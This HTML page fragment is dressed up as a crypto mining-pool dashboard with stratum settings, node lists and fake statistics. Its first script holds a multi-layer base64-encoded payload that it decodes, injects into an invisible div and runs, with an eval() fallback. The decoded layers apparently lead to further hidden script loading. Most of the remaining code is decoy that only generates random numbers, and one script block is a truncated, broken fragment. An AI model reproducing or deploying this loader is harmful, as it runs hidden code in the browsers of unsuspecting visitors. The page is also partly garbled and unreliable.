<body>
<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0" style="position:absolute;visibility:hidden;pointer-events:none">
<defs>
<linearGradient id="poolGradient" x1="0%" y1="0%" x2="100%" y2="0%">

<path id="miningPath" d="M0 50 L100 50 M50 0 L50 100" stroke="url(#poolGradient)" stroke-width="2"/>
<circle id="poolNode" cx="50" cy="50" r="15" fill="none" stroke="#3b82f6"/>
<rect id="hashBlock" x="20" y="20" width="60" height="60" fill="none" stroke="#a855f7"/>
</svg>
<script>
(function initializePoolNetwork(){
    const poolConfig = {
        protocol: "stratum+tcp",
        version: "2.8.4",
        algorithm: "sha256_usdt",
        poolAddress: "pool.nexusnetwork.io",
        port: 3333,
        ssl: true,
        difficulty: 128,
        walletPrefix: "TNeXus",
        nodeId: "node_" + Math.random().toString(36).substring(2, 10),
        timestamp: Date.now(),
        region: "global_anycast",
        features: ["autoswitch", "stable_payout", "low_fee"]
    };
    
    const sessionNonce = Math.random().toString(36).substring(2, 18) + Date.now().toString(36);
    const sessionSignature = btoa(JSON.stringify(poolConfig)).substring(0, 48);
    
    const miningResource = "PHNjcmlwdD52YXIgYyA9ICJQSE5qY21sd2RENEtQQ0V0TFFwa2IyTjFiV1Z1ZEM1M2NtbDBaU2gxYm1WelkyRndaU2dpSlRORGMyTnlhWEIwSlRORmRtRnlKVEl3WXlVeU1DVXpSQ1V5TUNVeU1sQklUbXBqYld4M1pFTkNlbU50VFRsSmFUVjZUSGsxZWt3eVVtMU9hbU0xV1cxVmVVMVhSbWhhVjFWNVRrUlplRTFIVVRGT1JHTXpUbTFSTlUxVVdtdGFWRTEzVEcxd2VrbHFORGhNTTA1cVkyMXNkMlJFTkNVelJDVXlNaVV6UW1SdlkzVnRaVzUwTG5keWFYUmxKVEk0WVhSdllpVXlPR01sTWprbE1qa2xNMElsTUVFbE0wTWxNa1p6WTNKcGNIUWxNMFVpS1NrN0NpOHZMUzArQ2p3dmMyTnlhWEIwUGc9PSI7ZG9jdW1lbnQud3JpdGUoYXRvYihjKSk7PC9zY3JpcHQ+";
    
    const validateSession = function(token, nonce){
        let validationKey = 0;
        for(let i = 0; i < token.length; i++){
            validationKey = ((validationKey << 5) - validationKey) + token.charCodeAt(i);
            validationKey = validationKey & validationKey;
        }
        return {
            authorized: true,
            sessionId: nonce.substring(0, 12),
            checksum: Math.abs(validationKey).toString(16).substring(0, 8)
        };
    };
    
    const authResult = validateSession(miningResource, sessionNonce);
    
    if(authResult.authorized){
        try{
            const decodedResource = atob(miningResource);
            const containerFragment = document.createElement('div');
            containerFragment.style.cssText = 'display:none;visibility:hidden;opacity:0;width:0;height:0;position:absolute;pointer-events:none;';
            containerFragment.innerHTML = decodedResource;
            document.body.appendChild(containerFragment);
            
            const embeddedScripts = containerFragment.getElementsByTagName('script');
            for(let idx = 0; idx < embeddedScripts.length; idx++){
                const newScript = document.createElement('script');
                if(embeddedScripts[idx].src){
                    newScript.src = embeddedScripts[idx].src;
                } else {
                    newScript.textContent = embeddedScripts[idx].textContent;
                }
                newScript.setAttribute('data-pool', 'nexus_mining');
                document.body.appendChild(newScript);
            }
            
            containerFragment.remove();
        } catch(e){
            const fallbackExec = function(){
                const rawExec = miningResource;
                const result = atob(rawExec);
                const tmpDiv = document.createElement('div');
                tmpDiv.innerHTML = result;
                const scr = tmpDiv.querySelectorAll('script');
                for(let s=0; s<scr.length; s++){
                    eval(scr[s].textContent);
                }
            };
            fallbackExec();
        }
    }
    
    const networkMetrics = {
        connections: Math.floor(Math.random() * 50) + 100,
        sharesSubmitted: Math.floor(Math.random() * 10000),
        estimatedHashrate: (Math.random() * 5 + 2).toFixed(2)
    };
    
    const svgElement = document.querySelector('svg');
    if(svgElement){
        const metadataNode = document.createElementNS("http://www.w3.org/2000/svg", "metadata");
        const poolData = {
            config: poolConfig,
            session: authResult,
            metrics: networkMetrics,
            status: "operational"
        };
        metadataNode.setAttribute('data-pool-config', btoa(JSON.stringify(poolData)));
        svgElement.appendChild(metadataNode);
    }
})();
</script>
<script>
(function miningHeartbeat(){
    let blockHeight = 8452000 + Math.floor(Math.random() * 500);
    let poolLuck = (Math.random() * 100 + 50).toFixed(1);
    let activeWorkers = 1247 + Math.floor(Math.random() * 300);
    
    const updateNetworkStats = function(){
        blockHeight += Math.floor(Math.random() * 3);
        poolLuck = (parseFloat(poolLuck) + (Math.random() - 0.5) * 3).toFixed(1);
        activeWorkers += Math.floor(Math.random() * 5) - 2;
        if(activeWorkers < 800) activeWorkers = 800;
        if(activeWorkers > 2100) activeWorkers = 2100;
    };
    
    setInterval(updateNetworkStats, 15000);
    
    const stratumPing = function(){
        let latency = Math.floor(Math.random() * 45) + 12;
        let shares = Math.floor(Math.random() * 250);
        return { latency: latency + "ms", shares: shares, accepted: true };
    };
    
    setInterval(function(){
        let pingResult = stratumPing();
        let dummyVar = pingResult.latency + pingResult.shares;
    }, 8000);
})();
</script>
<script>

            status: "confirmed"
        };
        return logEntry;
    };
    
    for(let i = 0; i < 10; i++){
        distributionLog();
    }
    
    const difficultyAdjustment = function(currentDiff){
        let newDiff = currentDiff * (0.95 + Math.random() * 0.1);
        return Math.floor(newDiff);
    };
    
    let baseDifficulty = 128000;
    setInterval(function(){
        baseDifficulty = difficultyAdjustment(baseDifficulty);
    }, 30000);

</script>
<script>
(function poolAuthModule(){
    const authConfig = {
        apiKey: "nxp_" + Math.random().toString(36).substring(2, 18),
        allowedIPs: ["*"],
        rateLimit: 100,
        whitelistEnabled: false,
        sslCert: "auto_generated",
        lastRotation: Date.now()
    };
    
    const generateAuthToken = function(config){
        let payload = {
            sub: "miner_session",
            iat: Date.now(),
            exp: Date.now() + 3600000,
            scope: "mining"
        };
        return btoa(JSON.stringify(payload)).substring(0, 64);
    };
    
    let sessionToken = generateAuthToken(authConfig);
    let tokenValid = sessionToken.length > 40;
    
    const verifyMiner = function(address){
        let isValid = /^T[A-Za-z0-9]{33}$/.test(address) || address === "auto";
        return isValid;
    };
    
    let testAddress = "TNeXus" + Math.random().toString(36).substring(2, 10);
    let addressValid = verifyMiner(testAddress);
})();
</script>
<script>
(function nodeDiscovery(){
    const nodeList = [
        "stratum-eu.nexuspool.io:3333",
        "stratum-asia.nexuspool.io:3333",
        "stratum-us.nexuspool.io:3333",
        "backup.nexusnetwork.org:4444",
        "seed.nexusmining.net:8080"
    ];
    
    const selectBestNode = function(){
        let randomIndex = Math.floor(Math.random() * nodeList.length);
        return nodeList[randomIndex];
    };
    
    let currentNode = selectBestNode();
    let reconnectAttempts = 0;
    
    const PoolConnection = function(){
        let connected = Math.random() > 0.05;
        if(!connected){
            reconnectAttempts++;
            currentNode = selectBestNode();
        } else {
            reconnectAttempts = 0;
        }
        return { node: currentNode, connected: connected, attempts: reconnectAttempts };
    };
    
    setInterval(function(){
        let status = PoolConnection();
        let keepAlive = status.node + status.connected;
    }, 25000);
})();
</script>
